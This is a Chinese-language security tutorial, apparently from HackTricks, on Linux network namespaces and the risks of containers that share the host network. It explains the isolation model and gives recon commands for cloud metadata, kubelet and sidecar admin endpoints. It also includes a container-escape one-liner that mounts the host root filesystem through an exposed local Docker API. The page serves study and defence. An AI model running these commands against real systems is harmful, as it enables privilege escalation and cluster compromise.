# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概述

网络命名空间会隔离与网络相关的资源，例如接口、IP 地址、路由表、ARP/neighbor 状态、防火墙规则、套接字、UNIX-domain abstract socket namespace，以及 `/proc/net` 等文件的内容。这就是为什么容器可以拥有看似属于自己的 `eth0`、本地路由和 loopback 设备，却不需要拥有主机真实的网络栈。

从安全角度来看，这一点很重要，因为网络隔离远不只是限制端口绑定。私有网络命名空间会限制工作负载能够直接观察或重新配置的内容。一旦该命名空间与主机共享，容器可能会突然获得对主机监听器、主机本地服务、abstract AF_UNIX endpoints 以及原本不应暴露给应用程序的网络控制点的可见性。

## 操作

新创建的网络命名空间在接口附加到其中之前，会处于空的或几乎为空的网络环境。随后，容器运行时会创建或连接 virtual interfaces、分配地址并配置路由，使工作负载获得预期的连接能力。在基于 bridge 的部署中，这通常意味着容器会看到一个连接到主机 bridge、由 veth 支持的接口。在 Kubernetes 中，CNI plugins 会处理等效的 Pod 网络设置。

这种架构解释了为什么 `--network=host` 或 `hostNetwork: true` 会带来如此显著的变化。工作负载不再获得预先准备好的私有网络栈，而是加入主机实际使用的网络栈。

## 实验

你可以使用以下命令查看一个几乎为空的网络命名空间：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你还可以使用以下方式比较普通容器和使用主机网络的容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
使用 host networking 的 container 不再拥有自己隔离的 socket 和 interface 视图。仅这一变化本身就已经非常重要，更不用说还要进一步确认该进程具有什么 capabilities。

## Runtime Usage

除非另行配置，Docker 和 Podman 通常会为每个 container 创建一个私有 network namespace。Kubernetes 通常会为每个 Pod 分配独立的 network namespace；该 namespace 由 Pod 内的 containers 共享，但与 host 分离。这意味着 `127.0.0.1` 通常是 Pod-local，而不是 container-local：在某个 container 中仅绑定到 localhost 的 listener，通常可被其 sidecar 和同一 Pod 中的其他 containers 访问。Incus/LXC 系统同样提供基于 network namespace 的丰富隔离机制，通常还支持更多种类的 virtual networking 配置。

其共同原则是：私有 networking 是默认的隔离边界，而 host networking 则是明确退出该边界的配置。

## Misconfigurations

最重要的 misconfiguration 就是直接共享 host network namespace。有时这样做是为了性能、低级别 monitoring 或便利性，但它会移除 container 可用的最清晰边界之一。Host-local listeners 会以更直接的方式变得可访问，仅限 localhost 的 services 可能因此暴露；如果存在 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 等 capabilities，风险会进一步增大，因为它们所启用的操作此时会作用于 host 自身的 network environment。

另一个问题是，即使 network namespace 仍为私有，也授予过多与 networking 相关的 capabilities。私有 namespace 确实能够提供帮助，但并不能让 raw sockets 或高级 network control 变得无害。

在 Kubernetes 中，`hostNetwork: true` 还会改变你对 Pod-level network segmentation 的信任程度。Kubernetes 文档指出，许多 network plugins 无法正确区分 `hostNetwork` Pod 的 traffic，以执行 `podSelector` / `namespaceSelector` matching，因此会将其视为普通 node traffic。从攻击者的角度看，这意味着被 compromise 的 `hostNetwork` workload 通常应被视为 node-level network foothold，而不是仍然受到与 overlay-network workloads 相同 policy assumptions 约束的普通 Pod。

## Abuse

在隔离较弱的 setup 中，攻击者可能会检查 host 上正在 listening 的 services，访问仅绑定到 loopback 的 management endpoints，嗅探或干扰 traffic（具体取决于 capabilities 和 environment），或者在存在 `CAP_NET_ADMIN` 时重新配置 routing 和 firewall state。在 cluster 中，这还可能使 lateral movement 和 control-plane reconnaissance 变得更容易。

如果怀疑使用了 host networking，首先确认可见的 interfaces 和 listeners 属于 host，而不是属于隔离的 container network：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅限 Loopback 的服务通常是第一个有趣的发现：
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Abstract UNIX sockets 是另一个容易被忽略的目标，因为它们受 network namespace 作用域限制，尽管它们看起来不像 TCP/UDP listeners，而且可能不会作为 `/run` 下的 filesystem paths 存在。因此，使用 host network 的 container 可能继承对仅限 host 的 control channels 的访问权限，即使这些 channels 从未被 bind-mounted 到 container 中：
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
一个历史案例是 `containerd-shim` abstract-socket 暴露漏洞，但更重要的启示并不在于具体的 CVE：一旦 workload 加入主机的 network namespace，abstract AF_UNIX 服务也会成为 attack surface 的一部分。如果这些 socket 看起来与 runtime 或管理操作有关，请转向 [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md)。

如果存在 network capabilities，请测试 workload 是否能够检查或修改其可见的 network stack：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在现代内核中，host networking 加上 `CAP_NET_ADMIN` 还可能使数据包路径暴露于简单的 `iptables` / `nftables` 修改之外。`tc` qdisc 和 filter 同样按 namespace 隔离，因此在共享的 host network namespace 中，它们会作用于容器可以看到的 host 接口。如果还存在 `CAP_BPF`，则与网络相关的 eBPF 程序（例如 TC 和 XDP loaders）也会变得相关：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
这很重要，因为攻击者可能能够在 host interface 层面 mirror、redirect、shape 或 drop 流量，而不仅仅是重写 firewall 规则。在 private network namespace 中，这些操作会被限制在 container 视图内；而在 shared host namespace 中，它们则会影响 host。

在 cluster 或 cloud 环境中，host networking 也意味着应快速对 metadata 和 control-plane-adjacent services 进行本地 recon：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
在 Kubernetes 中，请记住，攻陷 multi-container Pod 中的**任意** container，都可以访问 sibling containers 和 sidecars 开放的 localhost listeners，因为整个 Pod 共享同一个 network namespace。对于 service-mesh、可观测性和 helper containers 而言，这一点尤其重要，因为它们的 admin 或 debug interfaces 通常会被有意设计为仅限 Pod 内部访问，而不是面向整个集群：
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
将“绑定到 localhost”视为 **Pod-private**，而不是 **container-private**。Pod 中的一个 container 被攻陷后，这一假设就不再成立。

### 完整示例：Host Networking + Local Runtime / Kubelet Access

Host networking 不会自动提供 host root，但它通常会暴露一些本来只应从节点自身访问的服务。如果其中某个服务的保护较弱，Host networking 就会成为一条直接的权限提升路径。

localhost 上的 Docker API：
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost 上的 Kubelet：
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 如果本地 runtime API 在没有适当保护的情况下暴露，可能直接导致 host compromise
- 如果 kubelet 或本地 agents 可访问，可能进行 cluster reconnaissance 或 lateral movement
- 与 `CAP_NET_ADMIN` 结合时，可能操纵流量或造成 denial of service

## 检查

这些检查旨在了解进程是否拥有私有 network stack、可见哪些 routes 和 listeners，以及在测试 capabilities 之前，其 network view 是否已经呈现出类似 host 的特征。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
这里的重点是：

- 如果 `/proc/self/ns/net` 和 `/proc/1/ns/net` 看起来已经像 host 的 namespace，说明该 container 可能正在共享 host network namespace，或共享另一个非私有 namespace。
- 当 shell 已经位于某个 named 或 persistent namespace 中，并且你想将其与 host 侧 `/run/netns` 中的对象关联时，`lsns -t net` 和 `ip netns identify` 很有用。
- `ss -lntup` 尤其有价值，因为它可以显示仅监听 loopback 的 listener 和本地管理 endpoint。`ss -xap` 与 `/proc/net/unix` 还能补充 abstract socket 视图，发现普通 filesystem socket 搜索遗漏的对象。
- 如果存在 `CAP_NET_ADMIN`、`CAP_NET_RAW` 或 `CAP_BPF`，那么 routes、interface names、firewall context、`tc` 状态和 eBPF attachments 的重要性会显著提高。
- 在 Kubernetes 中，来自 `hostNetwork` Pod 的 service-name resolution 失败，可能只是因为该 Pod 没有使用 `dnsPolicy: ClusterFirstWithHostNet`，并不代表 service 不存在。
- 在 multi-container Pod 中，localhost listener 属于整个 Pod network namespace。因此，在判断某个仅监听 loopback 的 port 无法从被 compromise 的 container 访问之前，应先检查 sidecars 和 sibling containers。

检查 container 时，始终要结合 capability set 评估 network namespace。host networking 加上较强的 network capabilities，与 bridge networking 加上精简的 default capability set，代表的是完全不同的安全态势。

## References

- [Kubernetes NetworkPolicy 和 `hostNetwork` 注意事项](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [Linux `network_namespaces(7)` 与 abstract UNIX socket 隔离](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [containerd advisory：向 host-network containers 暴露 abstract Unix domain sockets](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [network-related eBPF programs 的 eBPF token 和 capability 要求](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
